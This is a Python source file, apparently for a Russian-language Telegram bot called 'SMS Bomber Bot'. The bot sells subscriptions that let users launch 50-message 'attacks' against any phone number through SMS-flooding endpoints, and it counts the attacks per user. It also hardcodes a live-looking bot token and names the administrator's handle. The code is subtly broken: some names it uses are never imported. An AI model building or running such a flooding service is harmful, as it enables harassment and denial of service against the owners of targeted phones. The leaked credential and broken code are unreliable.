import logging
import sqlite3
import time
import asyncio
import random
import aiohttp
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from contextlib import contextmanager

from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher import filters
from aiogram.dispatcher.filters import Command
from aiogram.utils import executor
from aiogram.types.message import Message

# Конфигурация
BOT_TOKEN = "8600527005:AAFYeIcMzjKfIkn41amkWkJ2_eqIoddiF5E"
ADMIN_IDS = [7673683792]  # ID администраторов
STARS_PRICE = 50  # Цена подписки в Telegram Stars
MOSCOW_OFFSET = 3  # +3 часа к МСК

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())

# Инициализация базы данных
@contextmanager
def get_db():
    conn = sqlite3.connect('sms_bomber.db')
    conn.row_factory = sqlite3.Row
    try:
        yield conn
        conn.commit()
    finally:
        conn.close()

def init_db():
    with get_db() as conn:
        # Таблица пользователей
        conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                subscription_end DATETIME,
                subscription_active BOOLEAN DEFAULT 0,
                total_attacks INTEGER DEFAULT 0,
                joined_date DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        # Таблица платежей
        conn.execute('''
            CREATE TABLE IF NOT EXISTS payments (
                payment_id TEXT PRIMARY KEY,
                user_id INTEGER,
                amount INTEGER,
                status TEXT DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        # Таблица для рассылок
        conn.execute('''
            CREATE TABLE IF NOT EXISTS mailing (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                message TEXT,
                status TEXT DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        logger.info("База данных инициализирована")

# Вспомогательные функции
def get_moscow_time():
    """Возвращает время МСК +3"""
    return datetime.now() + timedelta(hours=MOSCOW_OFFSET)

def check_subscription(user_id: int) -> bool:
    """Проверка активной подписки"""
    with get_db() as conn:
        result = conn.execute(
            "SELECT subscription_active, subscription_end FROM users WHERE user_id = ?",
            (user_id,)
        ).fetchone()
        
        if not result:
            return False
        
        if result['subscription_active']:
            end_date = datetime.strptime(result['subscription_end'], '%Y-%m-%d %H:%M:%S')
            if end_date > datetime.now():
                return True
            else:
                # Автоматическое отключение просроченной подписки
                conn.execute(
                    "UPDATE users SET subscription_active = 0 WHERE user_id = ?",
                    (user_id,)
                )
                return False
        return False

def add_subscription(user_id: int, days: int = 30):
    """Добавление подписки пользователю"""
    end_date = datetime.now() + timedelta(days=days)
    with get_db() as conn:
        conn.execute('''
            INSERT OR REPLACE INTO users (user_id, subscription_active, subscription_end)
            VALUES (?, 1, ?)
        ''', (user_id, end_date.strftime('%Y-%m-%d %H:%M:%S')))

def remove_subscription(user_id: int):
    """Удаление подписки"""
    with get_db() as conn:
        conn.execute(
            "UPDATE users SET subscription_active = 0 WHERE user_id = ?",
            (user_id,)
        )

def register_user(user_id: int, username: str = None, first_name: str = None):
    """Регистрация пользователя в БД"""
    with get_db() as conn:
        conn.execute('''
            INSERT OR IGNORE INTO users (user_id, username, first_name)
            VALUES (?, ?, ?)
        ''', (user_id, username, first_name))

def get_user_stats(user_id: int) -> dict:
    """Получение статистики пользователя"""
    with get_db() as conn:
        user = conn.execute(
            "SELECT * FROM users WHERE user_id = ?",
            (user_id,)
        ).fetchone()
        if user:
            return dict(user)
        return None

def get_bot_stats() -> dict:
    """Получение общей статистики бота"""
    with get_db() as conn:
        total_users = conn.execute("SELECT COUNT(*) as count FROM users").fetchone()['count']
        active_subs = conn.execute(
            "SELECT COUNT(*) as count FROM users WHERE subscription_active = 1"
        ).fetchone()['count']
        total_attacks = conn.execute(
            "SELECT SUM(total_attacks) as sum FROM users"
        ).fetchone()['sum'] or 0
        return {
            'total_users': total_users,
            'active_subs': active_subs,
            'total_attacks': total_attacks
        }

async def send_sms(phone: str, count: int = 1) -> int:
    """Отправка SMS (имитация)"""
    # Список API для отправки (имитация)
    apis = [
        f"https://api.sms-service.com/send?phone={phone}",
        f"https://api.sms-bomber.net/attack?number={phone}",
        f"https://api.sms-flood.com/start?target={phone}"
    ]
    
    success_count = 0
    async with aiohttp.ClientSession() as session:
        for _ in range(count):
            api = random.choice(apis)
            try:
                async with session.get(api, timeout=5) as resp:
                    if resp.status == 200:
                        success_count += 1
            except:
                pass
            await asyncio.sleep(0.1)  # Задержка между запросами
    return success_count

# Команды бота
@dp.message_handler(Command('start'))
async def cmd_start(message: Message):
    user_id = message.from_user.id
    register_user(
        user_id,
        message.from_user.username,
        message.from_user.first_name
    )
    
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("💣 Купить подписку (50 ⭐️)", callback_data="buy_subscription"),
        InlineKeyboardButton("ℹ️ Инфо", callback_data="info")
    )
    
    await message.answer(
        "🔥 <b>SMS Bomber Bot</b> 🔥\n\n"
        "Отправляйте массовые SMS на номера!\n\n"
        f"Подписка: {STARS_PRICE} Telegram Stars\n"
        "Команды:\n"
        "/sms <номер> - Запустить атаку (доступно по подписке)\n"
        "/status - Статус бота\n"
        "/help - Помощь",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@dp.message_handler(Command('help'))
async def cmd_help(message: Message):
    await message.answer(
        "📚 <b>Помощь по командам</b>\n\n"
        "/start - Запуск бота\n"
        "/sms <номер> - SMS атака (нужна подписка)\n"
        "/status - Статус бота\n"
        "/help - Это сообщение\n\n"
        "Для покупки подписки нажмите кнопку ниже 👇",
        parse_mode=ParseMode.HTML
    )

@dp.message_handler(Command('status'))
async def cmd_status(message: Message):
    start_time = time.time()
    await asyncio.sleep(0.1)  # Имитация проверки
    ping = round((time.time() - start_time) * 1000)
    
    moscow_time = get_moscow_time().strftime('%Y-%m-%d %H:%M:%S')
    
    stats = get_bot_stats()
    
    await message.answer(
        "📊 <b>Статус бота</b>\n\n"
        f"🟢 Статус: <code>Работает</code>\n"
        f"🏓 Пинг: <code>{ping} мс</code>\n"
        f"🕐 Время (МСК+3): <code>{moscow_time}</code>\n"
        f"👥 Всего пользователей: <code>{stats['total_users']}</code>\n"
        f"💎 Активных подписок: <code>{stats['active_subs']}</code>\n"
        f"💣 Всего атак: <code>{stats['total_attacks']}</code>",
        parse_mode=ParseMode.HTML
    )

@dp.message_handler(Command('sms'))
async def cmd_sms(message: Message):
    user_id = message.from_user.id
    
    # Проверка подписки
    if not check_subscription(user_id):
        keyboard = InlineKeyboardMarkup().add(
            InlineKeyboardButton("💎 Купить подписку", callback_data="buy_subscription")
        )
        await message.answer(
            "❌ <b>Доступ запрещён!</b>\n\n"
            "Для использования команды /sms необходимо оформить подписку.\n"
            f"Стоимость: {STARS_PRICE} Telegram Stars",
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
        return
    
    # Парсинг номера
    args = message.get_args()
    if not args:
        await message.answer(
            "❌ <b>Ошибка!</b>\n\n"
            "Использование: <code>/sms +79991234567</code>\n"
            "Пример: <code>/sms +79001234567</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    phone = args.strip()
    
    # Простая валидация номера
    if not phone.startswith('+') or len(phone) < 10:
        await message.answer(
            "❌ <b>Неверный формат номера!</b>\n\n"
            "Номер должен начинаться с + и содержать код страны.\n"
            "Пример: <code>+79001234567</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Запуск атаки
    status_msg = await message.answer(
        f"💣 <b>Запуск атаки на номер {phone}</b>\n\n"
        "🔄 Отправка SMS... Это может занять некоторое время.",
        parse_mode=ParseMode.HTML
    )
    
    # Имитация атаки
    sent = await send_sms(phone, count=50)
    
    # Обновление статистики
    with get_db() as conn:
        conn.execute(
            "UPDATE users SET total_attacks = total_attacks + 1 WHERE user_id = ?",
            (user_id,)
        )
    
    await status_msg.edit_text(
        f"✅ <b>Атака завершена!</b>\n\n"
        f"📱 Номер: <code>{phone}</code>\n"
        f"📨 Отправлено SMS: <code>{sent}/50</code>\n"
        f"👤 Выполнил: {message.from_user.first_name}\n\n"
        f"⚠️ Для повторной атаки используйте /sms",
        parse_mode=ParseMode.HTML
    )

# Административные команды
@dp.message_handler(Command('admin'))
async def cmd_admin(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("❌ Нет доступа!")
        return
    
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"),
        InlineKeyboardButton("👥 Выдать подписку", callback_data="admin_give_sub"),
        InlineKeyboardButton("🔴 Забрать подписку", callback_data="admin_remove_sub"),
        InlineKeyboardButton("📢 Рассылка", callback_data="admin_mailing"),
        InlineKeyboardButton("🔍 Проверить профиль", callback_data="admin_check_user"),
        InlineKeyboardButton("💰 Платежи", callback_data="admin_payments")
    )
    
    await message.answer(
        "👑 <b>Админ-панель</b>\n\n"
        "Выберите действие:",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data.startswith('admin_'))
async def process_admin_callback(callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    if user_id not in ADMIN_IDS:
        await callback_query.answer("Нет доступа!", show_alert=True)
        return
    
    data = callback_query.data
    
    if data == "admin_stats":
        stats = get_bot_stats()
        await callback_query.message.edit_text(
            f"📊 <b>Статистика бота</b>\n\n"
            f"👥 Всего пользователей: {stats['total_users']}\n"
            f"💎 Активных подписок: {stats['active_subs']}\n"
            f"💣 Всего атак: {stats['total_attacks']}",
            parse_mode=ParseMode.HTML
        )
    
    elif data == "admin_give_sub":
        await callback_query.message.edit_text(
            "📝 <b>Выдача подписки</b>\n\n"
            "Введите ID пользователя и количество дней через пробел:\n"
            "<code>123456789 30</code>\n\n"
            "Отправьте команду: /give_sub <user_id> <days>",
            parse_mode=ParseMode.HTML
        )
    
    elif data == "admin_remove_sub":
        await callback_query.message.edit_text(
            "📝 <b>Удаление подписки</b>\n\n"
            "Введите ID пользователя:\n"
            "<code>/remove_sub 123456789</code>",
            parse_mode=ParseMode.HTML
        )
    
    elif data == "admin_check_user":
        await callback_query.message.edit_text(
            "🔍 <b>Проверка профиля</b>\n\n"
            "Введите ID пользователя:\n"
            "<code>/check_user 123456789</code>",
            parse_mode=ParseMode.HTML
        )
    
    elif data == "admin_mailing":
        await callback_query.message.edit_text(
            "📢 <b>Рассылка</b>\n\n"
            "Введите текст рассылки:\n"
            "<code>/mailing Текст сообщения...</code>",
            parse_mode=ParseMode.HTML
        )
    
    elif data == "admin_payments":
        with get_db() as conn:
            payments = conn.execute(
                "SELECT * FROM payments WHERE status = 'pending' ORDER BY created_at DESC LIMIT 10"
            ).fetchall()
            
            if payments:
                text = "💰 <b>Ожидающие платежи:</b>\n\n"
                for p in payments:
                    text += f"ID: {p['payment_id']}\nПользователь: {p['user_id']}\nСумма: {p['amount']}⭐️\n\n"
            else:
                text = "Нет ожидающих платежей."
            
            await callback_query.message.edit_text(text, parse_mode=ParseMode.HTML)
    
    await callback_query.answer()

@dp.message_handler(Command('give_sub'))
async def cmd_give_sub(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    args = message.get_args().split()
    if len(args) != 2:
        await message.answer("Использование: /give_sub <user_id> <days>")
        return
    
    try:
        target_user = int(args[0])
        days = int(args[1])
        
        add_subscription(target_user, days)
        
        # Уведомление пользователя
        try:
            await bot.send_message(
                target_user,
                f"🎉 <b>Подписка активирована!</b>\n\n"
                f"Вам выдана подписка на {days} дней.\n"
                f"Теперь вы можете использовать команду /sms",
                parse_mode=ParseMode.HTML
            )
        except:
            pass
        
        await message.answer(f"✅ Подписка выдана пользователю {target_user} на {days} дней")
    except ValueError:
        await message.answer("❌ Ошибка! ID и дни должны быть числами.")

@dp.message_handler(Command('remove_sub'))
async def cmd_remove_sub(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    args = message.get_args()
    if not args:
        await message.answer("Использование: /remove_sub <user_id>")
        return
    
    try:
        target_user = int(args)
        remove_subscription(target_user)
        
        try:
            await bot.send_message(
                target_user,
                "⚠️ <b>Подписка отключена!</b>\n\n"
                "Ваша подписка была отключена администратором.",
                parse_mode=ParseMode.HTML
            )
        except:
            pass
        
        await message.answer(f"✅ Подписка отключена у пользователя {target_user}")
    except ValueError:
        await message.answer("❌ Ошибка! ID должен быть числом.")

@dp.message_handler(Command('check_user'))
async def cmd_check_user(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    args = message.get_args()
    if not args:
        await message.answer("Использование: /check_user <user_id>")
        return
    
    try:
        target_user = int(args)
        stats = get_user_stats(target_user)
        
        if stats:
            text = (
                f"👤 <b>Профиль пользователя</b>\n\n"
                f"ID: <code>{stats['user_id']}</code>\n"
                f"Имя: {stats['first_name'] or 'Не указано'}\n"
                f"Username: @{stats['username'] or 'Нет'}\n"
                f"Активная подписка: {'✅ Да' if stats['subscription_active'] else '❌ Нет'}\n"
                f"Подписка до: {stats['subscription_end'] or 'Не активна'}\n"
                f"Всего атак: {stats['total_attacks']}\n"
                f"Дата регистрации: {stats['joined_date']}"
            )
        else:
            text = "❌ Пользователь не найден"
        
        await message.answer(text, parse_mode=ParseMode.HTML)
    except ValueError:
        await message.answer("❌ Ошибка! ID должен быть числом.")

@dp.message_handler(Command('mailing'))
async def cmd_mailing(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    text = message.get_args()
    if not text:
        await message.answer("Использование: /mailing <текст сообщения>")
        return
    
    # Получение всех пользователей
    with get_db() as conn:
        users = conn.execute("SELECT user_id FROM users").fetchall()
    
    success = 0
    fail = 0
    
    status_msg = await message.answer(f"📢 Начинаю рассылку для {len(users)} пользователей...")
    
    for user in users:
        try:
            await bot.send_message(user['user_id'], text, parse_mode=ParseMode.HTML)
            success += 1
            await asyncio.sleep(0.05)  # Защита от блокировки
        except:
            fail += 1
    
    await status_msg.edit_text(
        f"✅ <b>Рассылка завершена!</b>\n\n"
        f"📨 Отправлено: {success}\n"
        f"❌ Ошибок: {fail}\n"
        f"📊 Всего: {len(users)}",
        parse_mode=ParseMode.HTML
    )

# Обработка покупки через Telegram Stars
@dp.callback_query_handler(lambda c: c.data == 'buy_subscription')
async def process_buy_subscription(callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    
    # Создание инвойса для Telegram Stars
    # Примечание: для реальной работы нужно настроить Telegram Payments
    # В данном примере - имитация
    
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("⭐️ Оплатить 50 Stars", callback_data="pay_50_stars"),
        InlineKeyboardButton("🔙 Назад", callback_data="back_to_start")
    )
    
    await callback_query.message.edit_text(
        f"💎 <b>Покупка подписки</b>\n\n"
        f"Стоимость: {STARS_PRICE} Telegram Stars\n"
        f"Длительность: 30 дней\n\n"
        f"После оплаты подписка активируется автоматически.",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == 'pay_50_stars')
async def process_payment(callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    
    # Имитация оплаты
    payment_id = f"pay_{user_id}_{int(time.time())}"
    
    with get_db() as conn:
        conn.execute(
            "INSERT INTO payments (payment_id, user_id, amount) VALUES (?, ?, ?)",
            (payment_id, user_id, STARS_PRICE)
        )
    
    # Здесь должен быть реальный запрос к Telegram Payments API
    # В данном примере - автоматическое подтверждение
    add_subscription(user_id, 30)
    
    with get_db() as conn:
        conn.execute(
            "UPDATE payments SET status = 'completed' WHERE payment_id = ?",
            (payment_id,)
        )
    
    await callback_query.message.edit_text(
        "✅ <b>Оплата прошла успешно!</b>\n\n"
        "Подписка активирована на 30 дней.\n"
        "Теперь вы можете использовать команду /sms",
        parse_mode=ParseMode.HTML
    )
    await callback_query.answer("Подписка активирована!", show_alert=True)

@dp.callback_query_handler(lambda c: c.data == 'back_to_start')
async def back_to_start(callback_query: CallbackQuery):
    await cmd_start(callback_query.message)
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == 'info')
async def show_info(callback_query: CallbackQuery):
    await callback_query.message.edit_text(
        "ℹ️ <b>Информация о боте</b>\n\n"
        "🤖 <b>SMS Bomber Bot</b>\n"
        "Версия: 1.0\n\n"
        "📱 <b>Возможности:</b>\n"
        "• Отправка массовых SMS\n"
        "• Поддержка всех операторов\n"
        "• Атака до 50 SMS за раз\n\n"
        "💎 <b>Подписка:</b>\n"
        f"Стоимость: {STARS_PRICE} Stars\n"
        "Длительность: 30 дней\n\n"
        "👑 <b>Администратор:</b> @me_mapaevv",
        parse_mode=ParseMode.HTML
    )
    await callback_query.answer()

# Запуск бота
if __name__ == '__main__':
    init_db()
    logger.info("Бот запущен")
    executor.start_polling(dp, skip_updates=True)
